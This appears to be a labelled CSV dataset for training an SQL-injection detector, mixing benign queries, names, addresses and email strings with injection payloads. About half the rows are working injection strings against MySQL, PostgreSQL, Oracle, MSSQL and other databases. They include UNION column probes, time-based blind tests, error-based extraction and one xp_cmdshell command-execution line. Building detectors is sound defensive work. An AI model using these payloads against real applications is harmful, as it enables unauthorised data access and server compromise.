Query,Label
"select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",1
"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",1
7stambrar,0
salhany0,0
SELECT AVG ( egg ) FROM start SELECT SUM ( shop ),0
"1"" ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
31519125v,0
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
"1%"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""%"" = """,1
"1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
baxie,0
"1"" ) ) and ( 3020 = 3020 ) *6703 and ( ( ""njdx"" like ""njdx",1
SELECT hang,0
"travesia uruguay, 172,",0
"1"" ) where 3826 = 3826",1
11615910j,0
cybolski.doumanian@cortinasartesol.bh,0
"1 ) ) as prnp where 4932 = 4932 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1
"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",1
SELECT * FROM slightly FETCH FIRST 3 ROWS ONLY,0
"1"" ) as paai where 4089 = 4089 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT * FROM first WHERE select NOT LIKE '[surrounded]%',0
indiestro,0
"1'+ ( select 'ovti' where 4243 = 4243 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) +'",1
SELECT * FROM sale WHERE forget = 'first',0
"1 ) ) as wezj where 2869 = 2869 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1
SELECT * FROM rocky 3 SELECT * FROM handle,0
1' ) ) ) or sleep ( 5 ) and ( ( ( 'wuwv' = 'wuwv,1
select ( case when ( 5163 = 4861 ) then 1 else 5163* ( select 5163 from master..sysdatabases ) end ) --,1
SELECT * FROM goes WHERE different = 'catch',0
17590r,0
37219,0
SELECT AVG ( laugh ) FROM onto,0
SELECT * FROM grandmother WHERE fourth NOT LIKE '[previous]%',0
condemios de arriba,0
"-4056"" ) ) ) union all select 4363,4363,4363,4363,4363,4363,4363,4363#",1
1 ) where 6884 = 6884 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1
zelada,0
SELECT AVG ( consonant ) FROM music SELECT SUM ( dinner ),0
SELECT curve ( s ) FROM these UNION,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 8671 ) ORDER BY meta_id ASC",0
SELECT * FROM ( SELECT start FROM cowboy ),0
1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ),1
"SELECT * FROM building WHERE remain NOT IN ( 'blanket', 'printed', 'eager' )",0
"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",1
6.81924E+15,0
or uid like '%,1
"senda buen paso s/n,",0
"1"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""rsru"" = ""rsru",1
"1',iif ( 6625 = 6625,1,1/0 )",1
"1"" union all select null,null,null,null,null,null,null,null,null#",1
SELECT daily ( s ) FROM shorter LEFT JOIN,0
3.61612E+15,0
",s",1
72ic5oid4,0
SELECT Count ( * ) AS consonant,0
select * from users where id = 1 <@1$ or 1 = 1 -- 1,1
"UPDATE species SET frog = 'safe', City = 'movie' WHERE flower = scientist",0
) ) or ( ( 'x' ) ) = ( ( 'x,1
"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )",1
"-8819"" ) where 9119 = 9119 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1
"UPDATE plant SET form = 'blanket', City = 'pound' WHERE hand = flat",0
/**/or/**/1/**/ = /**/1,1
"1%' ) ) and elt ( 4483 = 5364,5364 ) and ( ( '%' = '",1
SELECT TOP 50 PERCENT * FROM engineer,0
oco,0
2813,0
t45r97car,0
1 ) and 2457 = 8146,1
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( ""%"" = """,1
-6423' ) or 6872 = 6872,1
"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",1
"SELECT happily AS prove, rule AS [cat] FROM straw",0
SELECT AVG ( load ) FROM arrange,0
SELECT AVG ( Price ) FROM whale,0
SELECT shallow ( s ) FROM label LEFT JOIN,0
select ( case when ( 5142 = 6855 ) then 5142 else 5142* ( select 5142 from mysql.db ) end ) #,1
"1' ) as dwgv where 1525 = 1525 union all select null,null--",1
"1' where 8451 = 8451 union all select null,null,null,null,null,null,null,null,null#",1
"1' in boolean mode ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) #",1
6.03487E+15,0
demetrio,0
SELECT AVG ( wrong ) FROM pilot,0
"SELECT discuss,heart,leaf FROM quickly LEFT JOIN Orders ON map.somehowID = unless.finish ORDER BY very.create",0
SELECT * FROM bear WHERE standard BETWEEN 10 AND 20,0
antih sacido,0
"-5866' ) ) as phzq where 3803 = 3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",1
barlas,0
3.11985E+15,0
-4542' ) ) order by 1#,1
69364169x,0
SELECT COUNT ( grabbed ) FROM origin,0
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) +'",1
"1 ) ) ) union all select null,null,null,null,null,null#",1
SELECT * FROM welcome,0
cedric,0
"1"" ) ) union all select null,null,null,null,null,null#",1
"-5190%"" or 8298 = 9306 and ""%"" = """,1
"SELECT * FROM setting WHERE struck IN ( 'drink', 'giving', 'temperature' )",0
"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",1
5425,0
san miguel de abona,0
"c/ de las gloxinias 91,",0
"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'rpiz' like 'rpiz",1
4.42213E+15,0
"1 ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"1' where 1272 = 1272 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1
kannel,0
tuset mendel,0
"1"" ) ) ) union all select null,null,null,null#",1
SELECT pitch ( s ) FROM several INNER JOIN,0
"1' ) as keom where 7524 = 7524 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"-6928"" ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""mxhr"" like ""mxhr",1
ezri,0
"1"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""deeu"" like ""deeu",1
select sleep ( 5 ) and ( ( '%' = ',1
SELECT TOP 50 PERCENT * FROM travel SELECT * FROM usual FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stop,0
37650,0
"SELECT * FROM scared WHERE which NOT IN ( 'unless', 'island', 'managed' )",0
"1'+ ( select 'vfkl' where 1713 = 1713 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",1
SELECT * FROM club WHERE with BETWEEN 10 AND 20,0
( select ( case when ( 6035 = 9882 ) then 6035 else 6035* ( select 6035 from mysql.db ) end ) ),1
select case when 5894 = 4052 then 1 else null end--,1
truswell@soybueno.be,0
4.80152E+15,0
"1%' ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
ferrandez cabaas,0
SELECT chemical ( s ) FROM offer UNION,0
"1'+ ( select 'eoxk' where 6621 = 6621 union all select null,null#",1
SELECT AVG ( stop ) FROM crack SELECT SUM ( essential ),0
"1"" ) as ufai where 9673 = 9673",1
"1 ) ) as berd where 5803 = 5803 union all select null,null,null,null,null,null,null--",1
"UPDATE location SET couple = 'line', City = 'key' WHERE belt = village",0
SELECT applied ( s ) FROM suggest FULL OUTER JOIN,0
SELECT * FROM to WHERE dull BETWEEN '1996-07-01' AND '1996-07-31',0
select ( case when ( 5856 = 7176 ) then 5856 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
"1' ) where 3271 = 3271 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1
"SELECT evening,disappear,planet,pony,plain ( ( ability JOIN teeth ON beauty.stopped = high.duty ) INNER JOIN volumeON Orders.bite = meant.watchID )",0
"1"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
SELECT * FROM engine WHERE write = 'mouth',0
1' ) or sleep ( 5 ) and ( 'fizk' = 'fizk,1
"-5845' ) ) ) union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",1
1%' waitfor delay '0:0:5' and '%' = ',1
"1%"" and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"1"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
-7659' ) as bowy where 4835 = 4835 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1
"( select ( case when ( 3531 = 3531 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 3531 end ) )",1
SELECT * FROM paper FETCH FIRST 50 PERCENT ROWS ONLY,0
liesemer,0
DELETE FROM consider WHERE storm = 'stove',0
lotfaga,0
1064,0
wambsgan,0
"1"" ) as bksv where 5375 = 5375",1
"rodrigo caro, 165,",0
1 and ( 3020 = 3020 ) *6703# syuj,1
"1"" and elt ( 4594 = 1040,1040 )",1
"SELECT dull,pick FROM hat WHERE fell = 'time' UNION SELECT think, process FROM sound",0
lacruz morey,0
"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""ubvd"" = ""ubvd",1
"-9859"" ) ) ) union all select 6595,6595,6595,6595,6595,6595,6595#",1
1 ) as hggi where 6511 = 6511,1
SELECT COUNT ( fromID ) FROM sharp,0
"SELECT * FROM write ORDER BY nation ASC, simply DESC",0
SELECT * FROM strong WHERE event = 'obtain' OR phrase = 'daughter',0
"SELECT adult AS blue, having AS [chose] FROM off",0
SELECT * FROM read WHERE NOT high = 'cowboy' AND NOT water = 'wore',0
"1"" ) ) ) and 2006 = 2006",1
SELECT COUNT ( DISTINCT expect ) FROM substance,0
-7561 ) as ilrm where 8828 = 8828 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
tosigoso,0
"-5643' ) ) union all select 1515,1515#",1
SELECT COUNT ( youthID ) FROM greatest,0
-2214' ) union all select 8228#,1
SELECT AVG ( snake ) FROM spent SELECT SUM ( nobody ),0
1' in boolean mode ) and 5981 = 6700,1
SELECT AVG ( chemical ) FROM ants,0
-7187' or 4159 = 7465,1
calle nieto 41,0
romeralo pers,0
"SELECT look, honor+ ', ' + exist+ ' ' + indicate+ ', ' + example AS they FROM secret",0
komarov@docerosas.dk,0
"SELECT * FROM cannot WHERE soft IN ( 'toward', 'harbor', 'cloth' )",0
7529,0
( 7098 = 7098 and sleep ( 5 ) ),1
SELECT * FROM although WHERE favorite = 'widely' OR tone = 'country',0
select sleep ( 5 ) and ( ( 'ilcv' = 'ilcv,1
godayol iafrate,0
SELECT * FROM fewer ORDER BY suddenly,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 'knbx' like 'knbx",1
SELECT * FROM zulu WHERE respect LIKE '%death%',0
SELECT * FROM stopped WHERE rear = 'writing' FETCH FIRST 3 ROWS ONLY,0
"1' ) union all select null,null,null,null,null,null,null,null#",1
SELECT * FROM fair WHERE dirty = 'area' FETCH FIRST 3 ROWS ONLY,0
DELETE FROM teach WHERE its = 'all',0
ten.tar,0
"-8754"" ) ) ) union all select 7391,7391,7391,7391,7391,7391,7391--",1
SELECT DEGREES ( PI ( ) *2 ) ;,0
5.84996E+15,0
SELECT process,0
nihei_donat@multaspendientes.cu,0
5e011llo,0
SELECT option_value FROM wp_options WHERE option_name = 'options_footer_button_2_text' LIMIT 1,0
SELECT * FROM it WHERE native BETWEEN 'milk' AND 'sitting',0
"1' and make_set ( 8403 = 8403,8899 ) and 'lnwe' = 'lnwe",1
SELECT * FROM pan,0
"1 ) where 5385 = 5385 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"SELECT Orders.OrderID, Customers.CustomerName, Shippers.ShipperNameFROM ( ( OrdersINNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID ) INNER JOIN Shippers ON Orders.ShipperID = Shippers.ShipperID ) ;",0
SELECT * FROM alive,0
"SELECT PERIOD_ADD ( 201703, 15 ) ;",0
"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""qyew"" = ""qyew",1
enris6rar,0
"1', ( select ( case when ( 3888 = 3888 ) then ( select count ( * ) from generate_series ( 1,5000000 ) ) else 1/ ( select 0 ) end ) )",1
81,0
9.08272E+14,0
delete,1
SELECT * FROM strong WHERE NOT swam = 'from' AND NOT deal = 'cloth',0
SELECT AVG ( system ) FROM fix SELECT SUM ( dull ),0
18120,0
"SELECT policeman, sit+ ', ' + wait+ ' ' + whole+ ', ' + without AS older FROM there",0
SELECT mice ( s ) FROM winter,0
UPDATE drink SET ability = 'court'WHERE twice = 'union',0
SELECT * FROM arrangement FETCH FIRST 50 PERCENT ROWS ONLY,0
"1"" ) where 8196 = 8196",1
reto8sivo,0
"-3347%"" or 9323 = 9323#",1
5215,0
"1"" where 3740 = 3740 rlike sleep ( 5 ) #",1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) ) ||'",1
"-7737'|| ( select 'xalo' where 9219 = 9219 union all select 9219,9219,9219,9219#",1
"1'+ ( select aahc where 5436 = 5436 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) +'",1
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",1
brines grimalda,0
brias,0
1' ) ) as wdor where 7426 = 7426,1
1'|| ( select 'pyga' from dual where 8501 = 8501 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1
SELECT * FROM Customers LIMIT 3;,0
"SELECT COUNT ( CustomerID ) , CountryFROM CustomersGROUP BY Country;",0
1 ) as fxfe where 1148 = 1148 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1
"1"" ) ) as vdbf where 7969 = 7969 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1
SELECT * FROM gravity WHERE breathe = 'however' OR identity = 'hungry',0
waitfor delay '0:0:5' and ( ( ( 8981 = 8981,1
0al5a4,0
"1 ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 9313 = 9313",1
"-3007 ) where 6648 = 6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",1
ch61c795,0
"ronda sant antoni maria claret 144,",0
"-8614' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
econmicamente,0
8232,0
7.67E+15,0
SELECT * FROM goose FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM beginning WHERE fell NOT LIKE '[recently]%',0
39100,0
"1 ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 7984 = 7984",1
-4768'|| ( select 'dded' from dual where 6499 = 6499 union all select 6499--,1
"1 ) where 5598 = 5598 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"calle santa apolonia, 47,",0
SELECT Count ( * ) AS badly,0
SELECT * FROM fast WHERE tribe BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT TOP 3 * FROM daily WHERE wood = 'appropriate' SELECT * FROM income,0
"SELECT Orders.tentrID, Employees.wish, Employees.possibly FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.seasonID ORDER BY Orders.declaredID",0
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( '%' = '",1
-6843' or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'eeff' = 'eeff,1
"1"" union all select null,null,null,null,null,null#",1
SELECT AVG ( position ) FROM understanding,0
mcgovern-boxter@buscadordevideos.ag,0
eisenberg@muchochinoenchina.mx,0
53933880f,0
1 ) where 7050 = 7050,1
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id = tt.term_taxonomy_id WHERE tt.taxonomy IN ( 'agent_category', 'agent_city' ) AND tr.object_id IN ( 28446, 28587, 28591, 28618, 28621, 28633, 28636, 28691, 28696, 28699, 28707, 28710, 28728, 28733 ) ORDER BY t.name ASC",0
1%' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( '%' = ',1
ballou@adondeir.mn,0
"1"" ) ) or sleep ( 5 ) #",1
-4892%' ) ) or 2251 = 9881--,1
"1"" ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""jhtc"" like ""jhtc",1
"SELECT * FROM yourself WHERE turn NOT IN ( 'pony', 'degree', 'scared' )",0
SELECT mood ( s FROM wild RIGHT JOIN,0
( select * from ( select ( sleep ( 5 ) ) ) srmq ) ) ||',1
"-7267 ) union all select 1912,1912,1912,1912,1912,1912,1912,1912--",1
argecilla,0
"-5606 ) union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",1
SELECT * FROM anybody WHERE full = 'buffalo' AND ( conversation = 'rhythm' OR cost = 'merely' ),0
{s,1
"select * from generate_series ( 7610,7610,case when ( 7610 = 9416 ) then 1 else 0 end ) limit 1--",1
SELECT * FROM atom 3 SELECT * FROM immediately,0
SELECT COUNT ( mind ) FROM dog,0
SELECT * FROM ( SELECT indeed FROM noise ),0
SELECT * FROM course WHERE sink BETWEEN '1996-07-01' AND '1996-07-31',0
"-1620 ) ) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",1
1' ) ) union all select null#,1
"1"" ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
car52lit7,0
SELECT * FROM dried 3 SELECT * FROM tall,0
SELECT aside ( s ) FROM master UNION,0
SELECT nation ( s ) FROM spend INNER JOIN,0
es518l132n,0
SELECT ate FROM sides UNION ALL SELECT want FROM proper ORDER BY aloud,0
aguzadera,0
"SELECT SUBSTRING ( ""SQL Tutorial"", -5, 5 ) AS ExtractString;",0
SELECT DISTINCT force FROM lonely,0
"1'|| ( select 'pvmz' from dual where 1090 = 1090 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) ||'",1
aldeanueva de santa cruz,0
SELECT * FROM began,0
1 ) where 7165 = 7165 and sleep ( 5 ) #,1
"1'+ ( select rqcw where 9002 = 9002 union all select null,null,null,null,null,null,null,null,null#",1
stavro,0
SELECT * FROM grain WHERE tongue NOT LIKE '[automobile]%',0
"-8409%' ) or make_set ( 9354 = 9354,7185 ) and ( '%' = '",1
spears,0
amodeo sidany,0
8.73E+15,0
UPDATE particular SET melted = 'hunter'WHERE example = 'satellites',0
54368029p,0
av. del mar cantabrico 176 6-d,0
vies canales,0
"SELECT expect,thou,great FROM winter LEFT JOIN Orders ON forget.blockID = gold.paid ORDER BY television.across",0
"SELECT MAKETIME ( 838, 59, 59 ) ;",0
SELECT CURRENT_USER ( ) ;,0
"select * from users where id = 1 union select @ $,version ( ) -- 1",1
1 ) ) as fpej where 6790 = 6790 and ( 3020 = 3020 ) *6703--,1
SELECT TOP 3 * FROM mix,0
"1 ) ) ) union all select null,null,null--",1
"SELECT COUNT ( machine ) , pack FROM layers BY weak",0
"1%"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""%"" = """,1
SELECT * FROM join WHERE bad = 'rain' OR silent = 'possible',0
bernadet,0
vilamartn de valdeorras,0
SELECT until FROM nobody,0
"SELECT CONCAT_WS ( ""-"", ""SQL"", ""Tutorial"", ""is"", ""fun!"" ) AS ConcatenatedString;",0
"SELECT arrive AS mass, both AS [lose] FROM bad",0
macinnes,0
"SELECT * FROM directly WHERE office NOT IN ( 'in', 'character', 'thread' )",0
SELECT DISTINCT shape FROM carbon,0
"1' in boolean mode ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
naca39,0
"c/ rafael belmonte garcia, 29,",0
castell de rugat,0
